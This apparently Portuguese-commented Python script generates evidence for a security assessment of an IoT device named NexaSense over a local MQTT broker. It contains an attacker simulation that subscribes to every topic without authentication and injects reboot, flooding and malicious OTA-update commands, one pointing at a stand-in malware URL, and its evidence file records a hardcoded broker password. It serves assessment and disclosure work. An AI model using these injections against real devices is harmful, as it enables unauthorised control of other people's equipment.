"""
Script auxiliar: gera evidências MQTT sem loop lento.
Executa rapidamente e salva os arquivos de evidência.
"""
import paho.mqtt.client as mqtt
import json, time, random, os
from datetime import datetime, timezone

BROKER = "localhost"
PORT   = 1883
TOPIC_TELE = "/nexasense/device001/telemetry"
TOPIC_CMD  = "/nexasense/device001/cmd"

conn = [False]

def oc(c, u, f, rc, p=None):
    v = rc.value if hasattr(rc, "value") else int(rc)
    conn[0] = (v == 0)


def run_device_simulation(count=8):
    """Simula o dispositivo publicando telemetria."""
    cid = f"device001_sim_{random.randint(10000, 99999)}"
    cl = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=cid)
    cl.on_connect = oc
    cl.connect(BROKER, PORT, keepalive=60)
    cl.loop_start()

    for _ in range(40):
        time.sleep(0.05)
        if conn[0]:
            break

    if not conn[0]:
        print("[ERRO] Nao conectou ao broker.")
        cl.loop_stop()
        return []

    print(f"[MQTT] Conectado como {cid}")
    print(f"[MQTT] Broker: {BROKER}:{PORT} SEM TLS (achado F03)")
    print(f"[MQTT] Broker aceita conexao anonima (achado F06)")

    temp, hum = 24.5, 62.0
    published = []
    now_ts = int(datetime.now(timezone.utc).timestamp())

    for i in range(count):
        temp = max(18.0, min(35.0, temp + random.uniform(-0.3, 0.3)))
        hum  = max(30.0, min(95.0, hum  + random.uniform(-0.5, 0.5)))
        payload = {
            "device_id": "device001",
            "temp": round(temp, 1),
            "hum":  round(hum, 1),
            "ts":   now_ts + i * 30
        }
        cl.publish(TOPIC_TELE, json.dumps(payload), qos=0)
        ts_str = datetime.now().strftime("%H:%M:%S")
        print(f"[PUB] #{i+1:03d} [{ts_str}] {json.dumps(payload)}")
        published.append({"ts_str": ts_str, "payload": payload})
        time.sleep(0.1)

    time.sleep(0.3)
    cl.loop_stop()
    return published


def run_attacker_simulation():
    """Simula atacante injetando comandos."""
    conn2 = [False]
    received = []

    def oc2(c, u, f, rc, p=None):
        v = rc.value if hasattr(rc, "value") else int(rc)
        conn2[0] = (v == 0)
        if v == 0:
            c.subscribe("/nexasense/#", qos=0)

    def om(c, u, msg):
        received.append({"topic": msg.topic, "payload": msg.payload.decode()})

    cid_atk = f"attacker_{random.randint(10000, 99999)}"
    atk = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id=cid_atk)
    atk.on_connect = oc2
    atk.on_message = om
    atk.connect(BROKER, PORT, keepalive=60)
    atk.loop_start()

    for _ in range(40):
        time.sleep(0.05)
        if conn2[0]:
            break

    if not conn2[0]:
        print("[ATACANTE] Nao conectou.")
        atk.loop_stop()
        return []

    print(f"\n[ATACANTE] Conectado como {cid_atk} SEM autenticacao")
    print("[ATACANTE] Subscrito em /nexasense/#  (todos os dispositivos)")

    injected = []
    commands = [
        ({"cmd": "reboot", "source": "attacker"}, "Reboot forcado"),
        ({"cmd": "set_interval", "value": 1, "source": "attacker"}, "DoS de dados (1s)"),
        ({"cmd": "ota_update", "url": "http://evil.example.com/malware.bin"}, "OTA malicioso"),
    ]

    for cmd_data, desc in commands:
        payload_str = json.dumps(cmd_data)
        atk.publish(TOPIC_CMD, payload_str, qos=0)
        ts = datetime.now().strftime("%H:%M:%S")
        print(f"[INJECT] [{ts}] {TOPIC_CMD}")
        print(f"         {payload_str}  <- {desc}")
        injected.append({"ts": ts, "payload": payload_str, "desc": desc})
        time.sleep(0.2)

    time.sleep(0.3)
    atk.loop_stop()
    return injected


def save_telemetry_evidence(payloads):
    base   = os.path.dirname(os.path.abspath(__file__))
    ev_dir = os.path.join(base, "..", "network", "evidence")
    os.makedirs(ev_dir, exist_ok=True)
    path   = os.path.join(ev_dir, "mqtt-telemetry-payload.txt")
    now    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(path, "w", encoding="utf-8") as f:
        f.write("# NexaSense - Payloads MQTT capturados (simulacao)\n")
        f.write(f"# Data   : {now}\n")
        f.write(f"# Broker : {BROKER}:{PORT} (sem TLS -- achado F03)\n")
        f.write(f"# Topico : {TOPIC_TELE}\n")
        f.write("# User   : nexasense_device / Pass: mqttP@ss123 (hardcoded -- F04)\n")
        f.write("# Broker aceita conexao anonima (achado F06 -- allow_anonymous)\n\n")
        f.write("EVIDENCIA -- todo payload transmitido em TEXTO CLARO:\n\n")
        for i, p in enumerate(payloads, 1):
            f.write(f"#{i:03d} [{p['ts_str']}]  {json.dumps(p['payload'])}\n")

    print(f"\n[OK] Evidencia telemetria: {path}")


def save_inject_evidence(injected):
    base   = os.path.dirname(os.path.abspath(__file__))
    ev_dir = os.path.join(base, "..", "network", "evidence")
    os.makedirs(ev_dir, exist_ok=True)
    path   = os.path.join(ev_dir, "mqtt-inject-demo.txt")
    now    = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    with open(path, "w", encoding="utf-8") as f:
        f.write("# NexaSense - Demonstracao de Injecao MQTT (atacante)\n")
        f.write(f"# Data    : {now}\n")
        f.write(f"# Broker  : {BROKER}:{PORT}\n")
        f.write(f"# Topico  : {TOPIC_CMD}\n")
        f.write("# Achados : F03 (sem TLS), F06 (sem autenticacao), F08 (ID estatico)\n\n")
        f.write("COMANDOS INJETADOS SEM AUTENTICACAO:\n\n")
        for c in injected:
            f.write(f"[{c['ts']}] {c['payload']}\n")
            f.write(f"           -> {c['desc']}\n\n")
        f.write(f"\nCONCLUSAO:\n")
        f.write(f"  Comandos injetados : {len(injected)}\n")
        f.write(f"  Autenticacao       : NENHUMA\n")
        f.write(f"  Criptografia       : NENHUMA\n")
        f.write(f"  Qualquer cliente na rede pode controlar o dispositivo.\n")

    print(f"[OK] Evidencia injecao  : {path}")


if __name__ == "__main__":
    print("=" * 55)
    print("  Gerando evidencias MQTT completas")
    print("=" * 55)

    print("\n--- FASE 1: Simulacao do dispositivo ---")
    payloads = run_device_simulation(count=8)

    print("\n--- FASE 2: Simulacao do atacante ---")
    injected = run_attacker_simulation()

    print("\n--- Salvando evidencias ---")
    if payloads:
        save_telemetry_evidence(payloads)
    if injected:
        save_inject_evidence(injected)

    print("\n" + "=" * 55)
    print(f"  Mensagens publicadas : {len(payloads)}")
    print(f"  Comandos injetados   : {len(injected)}")
    print("=" * 55)
